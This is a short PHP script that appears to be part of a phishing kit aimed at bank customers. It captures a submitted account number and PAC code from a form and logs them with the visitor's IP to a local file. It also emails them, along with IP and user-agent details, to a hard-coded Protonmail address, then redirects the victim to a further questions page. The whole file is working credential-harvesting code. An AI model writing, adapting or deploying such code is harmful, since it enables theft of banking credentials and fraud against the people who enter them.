<?php
include('blocker.php');
?>
<?php

error_reporting(0);

$send = "rikkogreen44@protonmail.com";

$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['acctnum'];
$pass = $_POST['pac'];

$data ="
--------------------------------------------
          IP       : $ip
--------------------------------------------
Number   : $user

pac : $pass
-----------------3|$en----------------------

";

$subj="FOCU"; 

$fp = fopen('results.txt', 'a');
fwrite($fp, $data);
fclose($fp);
	
mail($send, $subj, $data . getenv("REMOTE_ADDR") . " | " . getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT']);


		   header("Location: questions.php");

?>
